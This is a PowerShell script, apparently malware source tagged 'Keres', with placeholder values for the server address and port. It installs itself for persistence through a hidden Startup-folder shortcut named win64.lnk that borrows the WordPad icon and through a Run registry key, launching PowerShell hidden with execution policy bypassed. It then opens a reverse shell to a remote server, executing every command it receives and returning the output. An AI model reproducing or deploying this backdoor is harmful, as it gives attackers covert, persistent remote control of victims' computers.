 
param(
    [string]$ScriptPath =(Resolve-Path -Path $MyInvocation.MyCommand.Path),
    [string]$IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe",
    [string]$HotKey = "CTRL+W",
    [string]$Description = "powershell",
    [int]$WindowStyle = 7,
    [switch]$Hidden = $true,
    [switch]$p,
    [string]$ScriptArgument = ""
)

# If -p parameter is present, create the shortcut
if ($p) {
    #Define the path for the shortcut in the Startup folder
	$shortcutPath = "$([Environment]::GetFolderPath('Startup'))\win64.lnk"
	$registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $registryPath -Name win64 -Value $shortcutPath

    # Create a WScript Shell object
    $wshell = New-Object -ComObject Wscript.Shell

    # Create or modify the shortcut object
    $shortcut = $wshell.CreateShortcut($shortcutPath)

    # Set the icon location for the shortcut
    $shortcut.IconLocation = $IconLocation

    # Set the target path and arguments for the shortcut
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $ScriptPath "

    # Set the working directory for the shortcut
    $shortcut.WorkingDirectory = (Get-Item $ScriptPath).DirectoryName

    # Set a hotkey for the shortcut
    $shortcut.HotKey = $HotKey

    # Set a description for the shortcut
    $shortcut.Description = $Description

    # Set the window style for the shortcut
    $shortcut.WindowStyle = $WindowStyle

    # Save the shortcut
    $shortcut.Save()

    # Optionally set the 'Hidden' attribute
    if ($Hidden) {
        [System.IO.File]::SetAttributes($shortcutPath, [System.IO.FileAttributes]::Hidden)
    }
}

$uniqueIdentifier = "Keres"
$maxProcesses = 1
$spawnedProcesses = 0

while ($true){{
    $isRunning = Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}

    if (-not $isRunning -and $spawnedProcesses -lt $maxProcesses) {{
        $connectionTest = Test-Connection -ComputerName 'server_address' -Count 1 -Quiet

        if ($connectionTest) {{
            Start-Process $PSHOME\powershell.exe -ArgumentList {{
                $uniqueIdentifier
                $client = New-Object System.Net.Sockets.TcpClient

                try {{
                    $client.Connect('server_address', port_number)
                    $stream = $client.GetStream()

                    while ($true) {{
                        if (-not $client.Connected) {{
                            Write-Host "Connection lost. Reconnecting..."
                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
                            break
                        }}

                        $bytes = New-Object byte[] 65535
                        $i = $stream.Read($bytes, 0, $bytes.Length)

                        if ($i -le 0) {{
                            Write-Host "Connection to server closed. Reconnecting..."
                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
                            break
                        }}

                        $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
                        $sendback = (iex $data 2>&1 | Out-String)
                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
                        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
                        $stream.Write($sendbyte, 0, $sendbyte.Length)
                        $stream.Flush()
                    }}
                }} catch {{
                    Write-Host "Error: $_"
                }} finally {{
                    if ($stream) {{ $stream.Close() }}
                    if ($client) {{ $client.Close() }}
                }}
            }} -WindowStyle Hidden

            $spawnedProcesses++
        }} else {{
            Write-Host "No connection to the server. Skipping process spawn."
        }}
    }} elseif ($spawnedProcesses -ge $maxProcesses) {{
        Write-Host "Maximum number of processes reached. Skipping process spawn."
    }} else {{
        Write-Host "Script is already running."
    }}

    # Count processes after a 60-second wait
    Start-Sleep -Seconds 60
    $spawnedProcesses = (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}).Count
}}
